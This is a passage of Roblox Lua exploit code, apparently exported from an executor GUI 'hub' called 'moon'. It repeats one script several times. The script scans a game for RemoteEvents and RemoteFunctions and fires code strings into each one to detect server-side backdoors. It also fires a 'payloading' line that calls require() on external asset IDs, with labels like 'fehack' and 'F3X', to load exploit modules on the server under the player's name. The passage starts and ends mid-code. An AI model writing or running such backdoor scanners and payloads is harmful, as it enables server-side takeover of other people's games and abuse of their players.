	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(7634392335)(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_41);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_4b()
	local script = G2L["4b"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(5115249013).fehack(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_4b);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_55()
	local script = G2L["55"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(14572394952)(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_55);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_5f()
	local script = G2L["5f"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(3436957371):r6(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_5f);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_69()
	local script = G2L["69"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(0x1767bf813)(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_69);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_73()
	local script = G2L["73"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(4869378421).F3X(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_73);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_7d()
	local script = G2L["7d"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(6056559552).load(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_7d);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_87()
	local script = G2L["87"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
